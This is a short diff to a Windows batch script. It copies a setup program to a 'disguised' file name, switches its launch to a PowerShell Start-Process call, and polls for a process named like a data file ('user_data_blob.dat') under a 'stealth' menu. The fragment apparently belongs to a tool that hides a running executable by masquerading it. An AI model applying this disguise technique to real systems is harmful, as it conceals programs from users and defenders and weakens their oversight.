@@ -201,7 +201,8 @@ if not exist "%SETUP_EXE%" (
     goto STEALTH_MENU
 )
 copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
-start "" /b "%DISGUISED_EXE%"
+"%PWSH%" -NoProfile -Command "Start-Process -FilePath '%DISGUISED_EXE%'"
+
 :WAIT_LOOP
 timeout /t 2 >nul
 tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /I "user_data_blob.dat" >nul
